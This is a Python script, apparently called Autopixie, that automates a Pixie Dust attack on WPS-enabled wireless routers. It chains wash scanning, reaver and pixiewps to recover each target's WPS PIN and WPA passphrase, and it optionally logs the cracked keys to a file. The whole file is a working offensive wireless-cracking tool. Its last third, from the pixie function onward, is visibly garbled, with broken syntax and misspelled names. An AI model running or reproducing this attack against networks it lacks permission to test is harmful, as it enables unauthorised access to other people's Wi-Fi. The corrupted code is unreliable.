import time
from subprocess import Popen, call
import os
import signal
import re
import sys

hasLog = ""
channel = ""
bssid = ""
interface = ""
wlan = ""
clr = "cls"


def menu():
    global clr, interface
    while True:
        menuSelect = ""
        os.system(clr)
        print("               ,-.----.                  ")
        print("   ,---,       \\    /  \\            .---.")
        print("  '  .' \\      |   :    \\          /. ./|")
        print(" /  ;    '.    |   |  .\\ :     .--'.  ' ;")
        print(":  :       \\   .   :  |: |    /__./ \\ : |")
        print(":  |   /\\   \\  |   |   \\ :.--'.  '   \\' .")
        print("|  :  ' ;.   : |   : .   /___/ \\ |    ' '")
        print("|  |  ;/  \\   \\;   | |`-';   \\  \\;      :")
        print("'  :  | \\  \\ ,'|   | ;    \\   ;  `      |")
        print("|  |  '  '--'  :   ' |     .   \\    .\\  ;")
        print("|  :  :        :   : :      \\   \\   ' \\ |")
        print("|  | ,'","       |   | :       :   '  |----")
        print("`--''          `---'.|        \\   \\ ; ///NxXxU   ")
        print("                 `---`         '--- v1.0.1")

        if hasLog == "Yes":
            print("           settings loaded.")
        print()
        print("Menu:")
        print("1: Manual input")
        print("2: Wash scan")
        print("3: start mon0 (setup in settings)")
        print("4: settings")
        print("5: Exit")
        print()
        menuSelect = input("Option:")

        if menuSelect == "1":
            Manual()
        elif menuSelect == "2":
            if interface == "":
                interface = input("interface:")
            if interface == "0":
                menu()
            Wash()
        elif menuSelect == "3":
            Startmon()
        elif menuSelect == "4":
            Settings()
        elif menuSelect == "5":
            exit()
        elif menuSelect.lower() == "debug":
            clr = ""
        elif menuSelect.lower() == "exit":
            exit()
        elif menuSelect.lower() == "i know your secrets":
            print("well you better keep your mouth shut!")


def Manual():
    global interface, channel, bssid, essid
    essid = "Not avail from manual attack."
    os.system(clr)
    if interface == "":
        interface = input("interface:")
    channel = input("channel:")
    if channel == "0":
        menu()
    bssid = input("bssid:")
    if bssid == "0":
        menu()
    reaver()


def Wash():
    global bssid, channel, essid
    if os.path.isfile("APW-Exclude"):
        with open('APW-Exclude') as ex:
            excludedBssid = ex.readlines()
    else:
        excludedBssid = ""
    fWashOut = open("fWashOut", "w")
    fWashError = open("fWashError", "w")
    pidW = Popen(["wash", "-i", interface, "-C"], stdout=fWashOut, stderr=fWashError).pid
    f = open('fWashOut')
    load = "-"
    try:
        while True:
            bssid = []
            channel = []
            essid = []
            pwr = []
            lock = []
            line = ""
            spacer = "- "
            f.seek(0)
            line = "s"
            while line:
                line = f.readline()
                if "[X]" in line:
                    sys.exit("Monitor interface failed!")
                if line[:5] != "BSSID":
                    if line[:5] != "-----":
                        essid.append(line[84:line.find("\n")])
                        bssid.append(line[:17])
                        channel.append(line[22:26])
                        pwr.append(line[37:41])
                        lock.append(line[64:69])
            os.system(clr)
            if len(bssid) == 1:
                print("Scan started, No accesspoints with WPS detected yet.", load)
            for x in range(0, len(bssid) - 1):
                if x == 0:
                    print("Press CTRL+C to stop scan and choose accesspoint")
                if x > 8:
                    spacer = "-"
                if any(bssid[x] in s for s in excludedBssid):
                    continue
                if "Y" in lock[x]:
                    print("\033[1;31m", x + 1, spacer, "-b:", bssid[x], " -c:", channel[x], "Pwr", pwr[x], "-e:",
                          essid[x], "\033[0m\033[1;32m")
                if "N" in lock[x]:
                    print("\033[0m\033[1;32m", x + 1, spacer, "-b:", bssid[x], " -c:", channel[x], "Pwr", pwr[x],
                          "-e:", essid[x])
            time.sleep(0.5)
            if load == "|":
                load = "/"
            elif load == "/":
                load = "-"
            elif load == "-":
                load = "\\"
            elif load == "\\":
                load = "|"
    except KeyboardInterrupt:
        print()
    os.kill(pidW, signal.SIGQUIT)
    choose = input("accesspoint:")
    if choose == "0":
        if os.path.isfile("fWashOut"):
            os.remove("fWashOut")
        if os.path.isfile("fWashError"):
            os.remove("fWashError")
        menu()
    choose = int(choose)
    bssid = bssid[choose - 1]
    channel = channel[choose - 1]
    channel.replace(" ", "")
    essid = essid[choose - 1]
    f.close()
    if os.path.isfile("fWashOut"):
        os.remove("fWashOut")
    if os.path.isfile("fWashError"):
        os.remove("fWashError")
    reaver()


def Startmon():
    global wlan
    if wlan:
        call(["airmon-ng", "start", wlan])
    else:
        print("Wlan card not specified in settings.")
        time.sleep(2)


def Settings():
    os.system(clr)
    print("Settings.")
    print()
    print("1: create new rules")
    print("2: back")
    print()
    settingChoose = input("settings:")
    if settingChoose == "1":
        uwlan = input("What physical wlan card to use? (ex. wlan0, wlan1):")
        umon = input("What mon is your default? (ex. mon0):")
        qq = "Use %s as default mon, and do not ask for it later? <y/n>:" % (umon)
        udmon = input(qq)
        ulog = input("store PIN and WPA-keys in logfile? <y/n>:")
        ulogfile = input("Save logfile as (ex. log, log.txt):")

        with open("APW-Conf", "w") as saves:
            saves.write("wlan:\n")
            uwlan = "%s\n" % (uwlan)
            saves.write(uwlan)
            saves.write("mon:\n")
            umon = "%s\n" % (umon)
            saves.write(umon)
            saves.write("UseDefMon:\n")
            if udmon.lower() == "y":
                saves.write("Yes\n")
            else:
                saves.write("No\n")
            saves.write("UseLog:\n")
            if ulog.lower() == "y":
                saves.write("Yes\n")
            else:
                saves.write("No\n")
            saves.write("LogName:\n")
            saves.write(ulogfile + "\n")
        LoadSettings()


def LoadSettings():
    global hasLog, interface, logFile, wlan
    hasLog = "Yes"
    with open('APW-Conf') as loadS:
        lines = loadS.readlines()
        for line in lines:
            if line == "wlan:\n":
                wlan = next(loadS).strip()
            if line == "mon:\n":
                interface = next(loadS).strip()
            if line == "UseDefMon:\n":
                useDm = next(loadS).strip()
            if line == "UseLog:\n":
                usel = next(loadS).strip()
            if line == "LogName:\n":
                logFile = next(loadS).strip()
    if useDm == "No":
        interface = ""
    if usel == "No":
        logFile = ""


def reaver():
    global PKE, PKEb, AuthKey, AuthKeyb, EHash1, EHash1b, EHash2, EHash2b, doing, Cline, bssid, WPAkey, WPSpin, PKR, PKRb, Enonce, Enonceb
    PKR = ""
    PKRb = ""
    Enonce = ""
    Enonceb = ""
    WPAkey = ""
    WPSpin = ""
    Cline = []
    PKE = ""
    EHash1 = ""
    EHash2 = ""
    AuthKey = ""
    PKEb = ""
    EHash1b = ""
    EHash2b = ""
    AuthKeyb = ""
    hashing = ""
    doing = "Retrieving hashes!"
    delsession = "/usr/local/etc/reaver/" + re.sub('[^A-Za-z0-9.]+', '', bssid) + ".wpc"
    if os.path.isfile(delsession):
        os.remove(delsession)
    fout = open("fReaverOut", "w")
    ferr = open("fReaverErrors", "w")
    pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv"], stdout=fout, stderr=ferr).pid
    f = open("fReaverOut")
    try:
        while True:
            line = f.readline()
            while line:
                if "PKE:" in line:
                    PKE = line[line.find("PKE:") + 5:line.find("\n")]
                    PKEb = len(re.sub('[^A-Fa-f0-9]+', '', PKE)) / 2
                if "AuthKey:" in line and AuthKeyb == "":
                    AuthKey = line[line.find("AuthKey:") + 9:line.find("\n")]
                    AuthKeyb = len(re.sub('[^A-Fa-f0-9]+', '', AuthKey)) / 2
                if "E-Hash1" in line and EHash1b == "":
                    EHash1 = line[line.find("E-Hash1:") + 9:line.find("\n")]
                    EHash1b = len(re.sub('[^A-Fa-f0-9]+', '', EHash1)) / 2
                if "E-Hash2" in line:
                    EHash2 = line[line.find("E-Hash2:") + 9:line.find("\n")]
                    EHash2b = len(re.sub('[^A-Fa-f0-9]+', '', EHash2)) / 2
                if "PKR:" in line:
                    PKR = line[line.find("PKR:") + 5:line.find("\n")]
                    PKRb = len(re.sub('[^A-Fa-f0-9]+', '', PKR)) / 2
                if "E-Nonce:" in line:
                    Enonce = line[line.find("E-Nonce:") + 9:line.find("\n")]
                    Enonceb = len(re.sub('[^A-Fa-f0-9]+', '', Enonce)) / 2
                if PKE != "" and AuthKey != "" and EHash1 != "" and EHash2 != "":
                    hashing = "done"
                Cline.append(line)
                line = f.readline()
            if not line:
                status()
            if hashing == "done":
                os.kill(pid, signal.SIGQUIT)
                f.close()
                if os.path.isfile("fReaverOut"):
                    os.remove("fReaverOut")
                if os.path.isfile("fReaverErrors"):
                    os.remove("fReaverErrors")
                pixie()
            time.sleep(0.1)
    except KeyboardInterrupt:
        print()
        f.close()
        if os.path.isfile("fReaverOut"):
            os.remove("fReaverOut")
        if os.path.isfile("fReaverErrors"):
            os.remove("fReaverErrors")
        menu()


def convPin():
    delsession = "/usr/local/etc/reaver/" + re.sub('[^A-Za-z0-9.]+', '', bssid) + ".wpc"
    if os.path.isfile(delsession):
        os.remove(delsession)
    global WPAkey, line
    fout = open("fReaverOut", "w")
    ferr = open("fReaverErrors", "w")
    pin = "--pin=%s" % (WPSpin)
    pid = Popen(["reaver", "-i", interface, "-c", channel, "-b", bssid, "-vv", pin], stdout=fout, stderr=ferr).pid
    f = open("fReaverOut")
    try:
        while True:
            line = f.readline()
            while line:
                if "WPA PSK:" in line:
                    break
                line = f.readline()
            if "WPA PSK:" in line:
                WPAkey = line
                break
            if not line:
                status()
            time.sleep(0.1)
        WPAkey = WPAkey[WPAkey.find("'") + 1:]
        WPAkey = WPAkey[:WPAkey.find("'")]
        status()
        print("Cracked!")
        select = input("Would you like to exclude this router from future wash scans? <N/y>:")
        if select.lower() == "y":
            bsside = bssid + "\n"
            with open("APW-Exclude", "a") as myfile:
                myfile.write(bsside)
        if logFile != "":
            with open(logFile, "a") as savelog:
                saveinfo = "essid:%s bssid:%s WPSpin:%s WPAkey:%s\n" % (essid, bssid, WPSpin, WPAkey)
                savelog.write(saveinfo)
        if os.path.isfile("fReaverOut"):
            os.remove("fReaverOut")
        if os.path.isfile("fReaverErrors"):
            os.remove("fReaverErrors")
        menu()
    except KeyboardInterrupt:
        os.kill(pid, signal.SIGQUIT)
        f.close()
        if os.path.isfile("fReaverOut"):
            os.remove("fReaverOut")
        if os.path.isfile("fReaverErrors"):
            os.remove("fReaverErrors")
        if logFile != "":
            with open(logFile, "a") as savelog:
                saveinfo = "essid:%s bssid:%s WPSpin:%s WPAkey:reaver was aborted" % (essid, bssid, WPSpin)
                savelog.write(saveinfo)
        print()
        menu()


def status():
    os.system(clr)
    print(doing)
    print("bssid:%s" % bssid)
    print("essid:%s" % essid)
    print()
    print("PKE:%s" % PKEb)
    print("PKR:%s" % PKRb)
    print("Authkey:%s" % AuthKeyb)
    print("E-Hash1:%s" % EHash1b)
    print("E-Hash2:%s" % EHash2b)
    print("E-Nonce:%s" % Enonceb)
    print()
    if WPSpin:
        print("PIN:%s" % WPSpin)
    else:
        print("PIN:")
    if WPAkey:
        print("WPA Key:%s" % WPAkey)
    else:
        print("WPA key")
    print()
    print()
    if Cline:
        line = Cline[len(Cline) - 1]
        print("\033[1;37;44m%s" % line[:70], "\033[0m\033[1;32m")


def pixie():
    global WPSpin
    fout2 = open("fPixiewpsOut", "w")
    ferr2 = open("fPixiewpsErrors", "w")
    runpixie = Popen(["pixiewps", "-e", PKE, "-r", PKR, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-n", Enonce],
                     stdout=fout2, stderr=ferr2)
    Popen.wait(runpixie)

    f = open("fPixiewpsOut")
    line = f.readline()
    while line:
        if "WPS pin:" in line:
            WPSpin = line
        elif "WPS pin not found!" in line:
            WPSpin = "WPS pin not found!"
        line = f.readline()
    f.close()
    os.remove("fPixiewpsErrors")
    os.remove("fPixiewpsOut")
    doing = "Bruteforcing pin!"
    status()
    if WPSpin == "WPS pin not found!":
    pixieS()
    else
        WPSpin = WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]        convPin()

def pixieS()
    global WPSpi
    fout2 = open("fPiiewpsOut", "w")
    ferr2 = open("fPixewpsErrors", "w")
    runpixie = Popen(["ixiewps", "-e", PKE, "-s", EHash1, "-z", EHash2, "-a", AuthKey, "-S"], stdout=fout2, stderr=ferr2)
    Popen.wait(runpixie)
    f = open"fPixiewpsOut")
    line = f.eadline()
    while line
        if "WPS pin:" in line:            WPSpin = line
    elif "WPS pin not found!" in line:
        WPSpin = "WPS pin not found!"
        ine = f.readline()
    f.cloemove("fPixiewpsErrors")
    os.rove("fPixiewpsOut")
    doing  "Bruteforcing pin!"
    status(
    if WPSpin== "WPS pin not found!":
        print(
        select = input("Would y like to exclude this router from future wash scans? <N/y>:")
        if select.lower() == "y":            bsside = bssid + "\n"
        with open("APW-Exclude", "a") as myfile:
            myfile.write(bsside)
    else
        WPSpin =WPSpin[WPSpin.find("WPS pin") + 9:WPSpin.find("\n")]
        convPin()    menu()

def exit(
    print("\033[0m")    sys.exit("Autopixie has run its course.")

if ospath.isfile("APW-Conf"):
    LodSettings()
print"\33[1;32m")

menu(